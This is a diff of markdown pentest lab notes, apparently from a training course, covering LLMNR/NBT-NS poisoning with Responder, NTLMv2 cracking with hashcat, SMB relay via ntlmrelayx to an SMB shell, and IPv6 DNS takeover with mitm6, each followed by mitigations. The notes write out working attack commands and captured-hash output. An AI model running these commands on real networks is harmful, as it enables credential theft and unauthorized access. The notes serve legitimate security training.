@@ -6,7 +6,7 @@
 
 ## LLMNR Poisoning Overview
 
-### What is LLMNR?
+#### What is LLMNR?
 
 Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification.
 
@@ -14,7 +14,7 @@ Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) a
 * Previously NBT-NS
 * Key flaw is that the services utilizes a user's username and NTLMv2 hash when appropriately responded to.
 
-### Steps
+#### Steps
 
 1. Run Responder
    1. `python3 /usr/share/responder/Responder.py -I tun0 -rdw -v`
@@ -25,9 +25,7 @@ Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) a
 4. Crack the Hashes
    1. `hashcat -m 5600 hashes.txt rockyou.txt`
 
-## Capturing NTLMv2 Hashes with Responder
-
-### Example
+### Capturing NTLMv2 Hashes with Responder
 
 #### From Kali
 
@@ -52,9 +50,7 @@ Responder grabs the hash from the previous event.
 [*] Skipping previously captured hash for MARVEL\fcastle
 ```
 
-## Password Cracking with Hashcat
-
-### Example
+### Password Cracking with Hashcat
 
 From the hash found in the previous section an attempt to crack it
 
@@ -64,9 +60,9 @@ kali@kali:~/ctf/tcm/peh$ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.t
 <HASH>:Password1
 ```
 
-## LLMNR Poisoning Defense
+### LLMNR Poisoning Defense
 
-### Mitigation
+#### Mitigation
 
 The best defense in this case is to disable LLMNR and NBT-NS.
 
@@ -80,7 +76,7 @@ If a company must use or cannot disable LLMNR/NBT-NS, the best course of action 
 
 ## SMB Relay Attacks Overview
 
-### What is SMB Relay?
+#### What is SMB Relay?
 
 Instead of cracking hashes gathered with Responder, we can instead relay those hashes to specific machines and potentially gain access.
 
@@ -89,7 +85,7 @@ Instead of cracking hashes gathered with Responder, we can instead relay those h
 * SMB signing must be disabled on the target
 * Relayed user credentials must be admin on machine.
 
-### Example
+#### Steps
 
 1. Run Responder
    1. vim /usr/share/responder/Responder.conf --> Turn Off SMB and HTTP
@@ -101,9 +97,7 @@ Instead of cracking hashes gathered with Responder, we can instead relay those h
    1. i.e. someone typed in the wrong network drive (DNS failing)
 5. Get the hashes
 
-## Discovering Hosts with SMB Signing Disabled
-
-### Example
+### Discovering Hosts with SMB Signing Disabled
 
 #### From Kali
 
@@ -116,11 +110,11 @@ Host scipr results:
 |     Message signing enabled but not required
 ```
 
-## SMB Relay Attack Demonstration
+### SMB Relay Attack Demonstration
 
 After making necessary changes to Responder.conf...
 
-### Run Responder
+#### Run Responder
 
 ```bash
 kali@kali:~/ctf/tcm/peh$ sudo responder -I eth0 -rdw
@@ -128,7 +122,7 @@ kali@kali:~/ctf/tcm/peh$ sudo responder -I eth0 -rdw
 [+] Listening for events...
 ```
 
-### Run ntlmrelayx
+#### Run ntlmrelayx
 
 ```bash
 kali@kali:~/ctf/tcm/peh$ ntlmrelayx.py -tf targets.txt -smb2support
@@ -136,7 +130,7 @@ kali@kali:~/ctf/tcm/peh$ ntlmrelayx.py -tf targets.txt -smb2support
 [*] Servers started, waiting for connections
 ```
 
-### Trigger Connection
+#### Trigger Connection
 
 #### From Target
 
@@ -170,9 +164,9 @@ We are in an SMB shell essentially
 # use C$
 ```
 
-## SMB Relay Attack Defenses
+### SMB Relay Attack Defenses
 
-### Mitigation
+#### Mitigation
 
 * Enable SMB Signing on all devices
   * Pro: Completely stops the attack
@@ -187,7 +181,7 @@ We are in an SMB shell essentially
   * Pro: Can prevent a lot of lateral movement
   * Con: Potential increase in the amount of service desk tickets
 
-## Gaining Shell Access
+### Gaining Shell Access
 
 Metasploit Walkthrough
 
@@ -195,15 +189,15 @@ Also Metasploit psexec vs psexec.py, wmiexec.py, smbexec.py
 
 ## IPv6 Attacks Overview
 
-## Installing mitm6
+### Installing mitm6
 
 {% embed url="https://github.com/dirkjanm/mitm6" %}
 
-## Setting Up LDAPS
+### Setting Up LDAPS
 
 Walkthrough of setting up LDAPS server on the Windows Server&#x20;
 
-## IPv6 DNS Takeover via mitm6
+### IPv6 DNS Takeover via mitm6
 
 #### Run mitm6
 
@@ -221,9 +215,9 @@ kali@kali:~/ctf/tcm/peh$ ntlmrelayx.py -6 -t ldaps//<LDAPS-IP> -wh fakewpad.marv
 
 {% embed url="https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation" %}
 
-## IPv6 Attack Defenses
+### IPv6 Attack Defenses
 
-### Mitigation
+#### Mitigation
 
 1. IPv6 poisoning abuses the fact that Windows queries for an IPv6 address even in IPv4-only environments. If you don't use IPv6 internally, the safest way to prevent mitm6 is to block DHCPv6 traffic and incoming router advertisements in Windows Firewall via Group Policy. Disabling IPv6 entirely may have unwanted side effects. Setting the following predefined rules to Block instead of Allow prevents the attack from working:
    1. a...
@@ -233,7 +227,7 @@ kali@kali:~/ctf/tcm/peh$ ntlmrelayx.py -6 -t ldaps//<LDAPS-IP> -wh fakewpad.marv
 3. Relaying to LDAP and LDAPS can only be mitigated by enabling both LDAP signing and LDAP channel binding.
 4. Consider Administrative users to the Protected Users group or marking them as Account is sensitive and cannot be delegated, which will prevent any impersonation of that user via delegation.
 
-## Passback Attacks
+### Passback Attacks
 
 {% embed url="https://www.mindpointgroup.com/blog/how-to-hack-through-a-pass-back-attack" %}
 
